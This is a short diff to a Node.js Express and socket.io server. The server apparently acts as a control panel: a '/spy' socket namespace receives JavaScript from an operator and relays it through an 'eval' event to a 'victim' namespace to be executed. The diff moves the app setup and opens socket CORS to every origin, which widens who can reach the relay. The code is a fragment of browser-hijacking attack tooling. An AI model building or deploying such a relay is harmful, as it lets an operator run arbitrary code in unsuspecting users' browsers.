@@ -9,14 +9,14 @@ import * as logger from './middlewares/logger.js'
 
 const __dirname = path.resolve()
 
-const app = express();
-
+// Config ports to listen on
 const config = {
     HTTPS_PORT: 8443,
     HTTP_PORT: 8080,
     WEB_SOCKET_PORT: 3000
 }
 
+const app = express();
 
 app.use(logger.request)
 app.use("/", express.static(path.join(__dirname, 'public')));
@@ -29,13 +29,17 @@ app.use("/controller", (req, res) => {
 
 
 const socketServer = http.createServer(app);
-const io = new Server(socketServer);
+const io = new Server(socketServer, {
+    cors: {
+        origin: '*',
+      }
+});
 
 const spy = io
     .of('/spy')
     .on('connection', (socket) => {
         logger.socketSpy(socket, 'connected');
-        
+
         socket.on('eval', function (js) {
             logger.socketSpy(socket, 'eval', js);
             victim.emit('eval', js);
